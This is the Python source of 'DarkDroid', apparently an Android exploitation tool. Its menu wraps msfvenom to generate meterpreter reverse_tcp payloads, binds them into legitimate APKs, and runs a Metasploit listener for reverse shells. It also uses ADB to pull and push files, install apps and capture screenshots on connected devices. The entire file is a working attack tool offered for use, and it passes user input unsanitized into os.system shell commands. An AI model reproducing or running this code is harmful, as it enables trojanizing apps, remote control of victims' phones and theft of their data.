#!/usr/bin/env python3
import os
import sys
import time
import subprocess
from threading import Thread
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

class DarkDroid:
    def __init__(self):
        self.current_device = None
        self.listener_thread = None
        self.listener_active = False
        self._last_menu_display = 0
        self.commands = [
            ('1', 'List Connected Devices', self.list_devices),
            ('2', 'Connect to Device', self.connect_device),
            ('3', 'Get Shell', self.get_shell),
            ('4', 'Generate Payload', self.generate_payload),
            ('5', 'Bind Payload to APK', self.bind_apk),
            ('6', 'Start Listener', self.start_listener),
            ('7', 'Stop Listener', self.stop_listener),
            ('8', 'Pull File/Folder', self.pull_data),
            ('9', 'Push File', self.push_data),
            ('10', 'Install APK', self.install_apk),
            ('11', 'Check Requirements', self.check_requirements),
            ('12', 'Reboot Device', self.reboot_device),
            ('13', 'Capture Screenshot', self.capture_screenshot),
            ('14', 'Get Device Info', self.device_info),
            ('0', 'Exit DarkDroid', self.exit_tool)
        ]

    def print_banner(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        banner_art = r"""
              __    ________               .__    .___
\______ \ _____ _______|  | __\______ \_______  ____ |__| __| _/
 |    |  \\__  \\_  __ \  |/ / |    |  \_  __ \/  _ \|  |/ __ | 
 |    `   \/ __ \|  | \/    <  |    `   \  | \(  <_> )  / /_/ | 
/_______  (____  /__|  |__|_ \/_______  /__|   \____/|__\____ | 
        \/     \/           \/        \/                     \/ 
        """
        print(Fore.RED + banner_art)
        print(Fore.LIGHTWHITE_EX + Style.BRIGHT + "Android ADB Exploitation Framework")
        print(Fore.LIGHTBLACK_EX + f"Version 3.1 | Author: CyberWarLab |Date: {time.strftime('%Y-%m-%d')}\n")

    def show_menu(self, force=False):
        """Display menu only when forced or after long inactivity"""
        if force or (time.time() - self._last_menu_display > 60):
            print(Fore.LIGHTWHITE_EX + "Available Commands:")
            print("-"*60)
            
            # Two-column display
            left_commands = self.commands[:7]
            right_commands = self.commands[7:]
            
            for (left, right) in zip(left_commands, right_commands):
                left_num, left_desc, _ = left
                right_num, right_desc, _ = right
                print(f"{Fore.LIGHTCYAN_EX}[{left_num}] {Fore.LIGHTWHITE_EX}{left_desc.ljust(25)}", end="")
                print(f"{Fore.LIGHTCYAN_EX}[{right_num}] {Fore.LIGHTWHITE_EX}{right_desc}")
            
            print("-"*60)
            print(Fore.LIGHTYELLOW_EX + f"[+] Listener Status: {'ACTIVE' if self.listener_active else 'INACTIVE'}")
            print(Fore.LIGHTGREEN_EX + f"[+] Connected Device: {self.current_device or 'None'}\n")
            self._last_menu_display = time.time()

    def clear_screen(self):
        """Clear terminal screen"""
        os.system('clear' if os.name == 'posix' else 'cls')

    def verify_device_connection(self):
        if not self.current_device:
            return False
        
        try:
            result = subprocess.run(
                ['adb', '-s', self.current_device, 'get-state'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            return 'device' in result.stdout.lower()
        except:
            return False

    def run_listener(self, lhost, lport):
        self.listener_active = True
        try:
            command = [
                'msfconsole', '-q', '-x',
                f'use exploit/multi/handler; '
                f'set PAYLOAD android/meterpreter/reverse_tcp; '
                f'set LHOST {lhost}; set LPORT {lport}; '
                f'set ExitOnSession false; exploit -j'
            ]
            subprocess.run(command)
        except Exception as e:
            print(Fore.RED + f"[-] Listener error: {e}")
        finally:
            self.listener_active = False

    def start_listener(self):
        if self.listener_active:
            print(Fore.RED + "[-] Listener already running!")
            return
        
        print(Fore.LIGHTBLUE_EX + "\n[=] Listener Configuration")
        lhost = input(Fore.LIGHTWHITE_EX + "[?] Enter LHOST: ").strip()
        lport = input(Fore.LIGHTWHITE_EX + "[?] Enter LPORT: ").strip()
        
        if not lhost or not lport:
            print(Fore.RED + "[-] LHOST and LPORT are required!")
            return
        
        self.listener_thread = Thread(target=self.run_listener, args=(lhost, lport))
        self.listener_thread.daemon = True
        self.listener_thread.start()
        
        print(Fore.GREEN + f"\n[+] Listener started on {lhost}:{lport}")
        print(Fore.LIGHTBLACK_EX + "[*] Use 'Stop Listener' (7) to terminate")

    def stop_listener(self):
        if not self.listener_active:
            print(Fore.RED + "[-] No active listener found!")
            return
        
        try:
            subprocess.run(['msfconsole', '-q', '-x', 'sessions -K; exit'])
            self.listener_active = False
            print(Fore.GREEN + "[+] Listener stopped successfully")
        except Exception as e:
            print(Fore.RED + f"[-] Error stopping listener: {e}")

    def list_devices(self):
        print(Fore.LIGHTYELLOW_EX + "\n[*] Connected Devices:")
        print("-"*40)
        os.system('adb devices -l')
        print()

    def connect_device(self):
        device = input(Fore.LIGHTWHITE_EX + "[?] Enter Device ID or IP: ").strip()
        if not device:
            return
        
        if '.' in device:
            print(Fore.LIGHTYELLOW_EX + "\n[*] Attempting to connect to device...")
            result = subprocess.run(['adb', 'connect', device], capture_output=True, text=True)
            if 'connected' not in result.stdout:
                print(Fore.RED + "[-] Failed to connect to device!")
                print(Fore.RED + result.stderr)
                return
        
        result = subprocess.run(['adb', 'devices'], capture_output=True, text=True)
        if device not in result.stdout:
            print(Fore.RED + f"[-] Device {device} not found!")
            return
        
        self.current_device = device
        print(Fore.GREEN + f"\n[+] Connected to: {device}")

    def get_shell(self):
        if not self.verify_device_connection():
            print(Fore.RED + "\n[-] No device connected or device not responding!")
            print(Fore.YELLOW + "[*] Use 'List Devices' (1) and 'Connect to Device' (2) first")
            return
        
        print(Fore.LIGHTYELLOW_EX + f"\n[*] Launching shell on {self.current_device}...")
        print(Fore.LIGHTBLACK_EX + "[*] Type 'exit' to return to DarkDroid")
        print("-"*60)
        os.system(f'adb -s {self.current_device} shell')
        print("-"*60)
        print(Fore.LIGHTBLUE_EX + "\n[*] Returned to DarkDroid")

    def generate_payload(self):
        print(Fore.LIGHTBLUE_EX + "\n[=] Payload Generator")
        print("-"*40)
        payload = input(Fore.LIGHTWHITE_EX + "[?] Payload (e.g. android/meterpreter/reverse_tcp): ").strip()
        lhost = input(Fore.LIGHTWHITE_EX + "[?] Enter LHOST: ").strip()
        lport = input(Fore.LIGHTWHITE_EX + "[?] Enter LPORT: ").strip()
        output = input(Fore.LIGHTWHITE_EX + "[?] Output APK name (e.g. payload.apk): ").strip()
        
        if not all([payload, lhost, lport, output]):
            print(Fore.RED + "[-] All fields are required!")
            return
        
        print(Fore.LIGHTYELLOW_EX + "\n[*] Generating payload...")
        os.system(f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -o {output}")
        print(Fore.GREEN + f"\n[+] Payload generated: {output}")

    def bind_apk(self):
        print(Fore.LIGHTBLUE_EX + "\n[=] APK Binding")
        print("-"*40)
        original_apk = input(Fore.LIGHTWHITE_EX + "[?] Path to Original APK: ").strip()
        output_apk = input(Fore.LIGHTWHITE_EX + "[?] Output APK name: ").strip()
        
        if not os.path.exists(original_apk):
            print(Fore.RED + "[-] Original APK file not found!")
            return
        
        print(Fore.LIGHTYELLOW_EX + "\n[*] Binding payload into APK...")
        os.system(f'msfvenom -x {original_apk} -p android/meterpreter/reverse_tcp -o {output_apk}')
        print(Fore.GREEN + f"\n[+] Bound APK created: {output_apk}")

    def pull_data(self):
        if not self.verify_device_connection():
            print(Fore.RED + "\n[-] No device connected or device not responding!")
            return
        
        src = input(Fore.LIGHTWHITE_EX + "[?] Remote path to pull: ").strip()
        dst = input(Fore.LIGHTWHITE_EX + "[?] Local destination: ").strip()
        
        print(Fore.LIGHTYELLOW_EX + "\n[*] Pulling data...")
        os.system(f'adb -s {self.current_device} pull "{src}" "{dst}"')
        print(Fore.GREEN + "\n[+] Data pulled successfully")

    def push_data(self):
        if not self.verify_device_connection():
            print(Fore.RED + "\n[-] No device connected or device not responding!")
            return
        
        src = input(Fore.LIGHTWHITE_EX + "[?] Local file path: ").strip()
        dst = input(Fore.LIGHTWHITE_EX + "[?] Remote destination: ").strip()
        
        if not os.path.exists(src):
            print(Fore.RED + "[-] Source file not found!")
            return
        
        print(Fore.LIGHTYELLOW_EX + "\n[*] Pushing data...")
        os.system(f'adb -s {self.current_device} push "{src}" "{dst}"')
        print(Fore.GREEN + "\n[+] Data pushed successfully")

    def install_apk(self):
        if not self.verify_device_connection():
            print(Fore.RED + "\n[-] No device connected or device not responding!")
            return
        
        apk = input(Fore.LIGHTWHITE_EX + "[?] APK file path: ").strip()
        
        if not os.path.exists(apk):
            print(Fore.RED + "[-] APK file not found!")
            return
        
        print(Fore.LIGHTYELLOW_EX + "\n[*] Installing APK...")
        os.system(f'adb -s {self.current_device} install "{apk}"')
        print(Fore.GREEN + "\n[+] APK installation completed")

    def check_requirements(self):
        tools = ['adb', 'msfvenom', 'msfconsole', 'keytool', 'jarsigner']
        print(Fore.LIGHTBLUE_EX + "\n[=] Checking Requirements:")
        print("-"*40)
        
        for tool in tools:
            if os.system(f"which {tool} > /dev/null 2>&1") == 0:
                print(Fore.GREEN + f"[✓] {tool.ljust(15)} Found")
            else:
                print(Fore.RED + f"[✗] {tool.ljust(15)} Missing")
        
        print("-"*40)

    def reboot_device(self):
        if not self.verify_device_connection():
            print(Fore.RED + "\n[-] No device connected or device not responding!")
            return
        
        confirm = input(Fore.YELLOW + "[?] Reboot connected device? (y/n): ").lower()
        if confirm == 'y':
            print(Fore.LIGHTYELLOW_EX + "\n[*] Rebooting device...")
            os.system(f"adb -s {self.current_device} reboot")
            print(Fore.GREEN + "\n[+] Reboot command sent")
        else:
            print(Fore.LIGHTBLACK_EX + "\n[*] Reboot canceled")

    def capture_screenshot(self):
        if not self.verify_device_connection():
            print(Fore.RED + "\n[-] No device connected or device not responding!")
            return
        
        filename = f"screenshot_{time.strftime('%Y%m%d_%H%M%S')}.png"
        print(Fore.LIGHTYELLOW_EX + "\n[*] Capturing screenshot...")
        
        os.system(f"adb -s {self.current_device} shell screencap -p /sdcard/{filename}")
        os.system(f"adb -s {self.current_device} pull /sdcard/{filename}")
        os.system(f"adb -s {self.current_device} shell rm /sdcard/{filename}")
        
        print(Fore.GREEN + f"\n[+] Screenshot saved as {filename}")

    def device_info(self):
        if not self.verify_device_connection():
            print(Fore.RED + "\n[-] No device connected or device not responding!")
            return
        
        print(Fore.LIGHTBLUE_EX + "\n[=] Device Information:")
        print("-"*60)
        os.system(f"adb -s {self.current_device} shell getprop")
        print("-"*60)

    def exit_tool(self):
        if self.listener_active:
            self.stop_listener()
        print(Fore.LIGHTYELLOW_EX + "\n[+] Exiting DarkDroid...")
        print(Fore.LIGHTBLACK_EX + "[*] Remember: With great power comes great responsibility.")
        sys.exit(0)

    def run(self):
        self.print_banner()
        while True:
            try:
                self.show_menu(force=True)
                choice = input(Fore.LIGHTWHITE_EX + "darkdroid> ").strip()
                
                cmd = next((c for c in self.commands if c[0] == choice), None)
                if cmd:
                    self.clear_screen()
                    cmd[2]()  # Execute command
                    
                    # Don't prompt for these commands
                    if choice not in ['0', '3']:
                        input(Fore.LIGHTBLACK_EX + "\n[*] Press Enter to continue...")
                else:
                    print(Fore.RED + "[-] Invalid option. Please try again.")
                    
            except KeyboardInterrupt:
                print(Fore.LIGHTRED_EX + "\n[!] Use option '0' to exit properly.")
                input(Fore.LIGHTBLACK_EX + "[*] Press Enter to continue...")
            except Exception as e:
                print(Fore.RED + f"[-] Error: {str(e)}")
                input(Fore.LIGHTBLACK_EX + "\n[*] Press Enter to continue...")

if __name__ == '__main__':
    try:
        tool = DarkDroid()
        tool.run()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[-] Forced exit detected. Cleaning up...")
        sys.exit(1)